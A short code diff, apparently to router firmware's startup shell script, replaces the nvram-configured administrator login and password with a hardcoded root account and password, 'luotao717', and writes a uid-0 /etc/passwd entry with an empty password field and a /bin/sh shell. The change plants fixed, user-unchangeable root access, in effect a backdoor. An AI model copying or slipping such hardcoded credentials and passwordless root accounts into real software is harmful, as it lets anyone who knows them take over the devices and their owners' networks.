@@ -288,8 +288,10 @@ enlargeFreeMemReclaim()
 
 genSysFiles()
 {
-	login=`nvram_get 2860 Login`
-	pass=`nvram_get 2860 Password`
+#	login=`nvram_get 2860 Login`
+#	pass=`nvram_get 2860 Password`
+	login=root
+	pass=luotao717
 	if [ "$login" != "" -a "$pass" != "" ]; then
 	echo "$login::0:0:Adminstrator:/:/bin/sh" > /etc/passwd
 	echo "$login:x:0:$login" > /etc/group
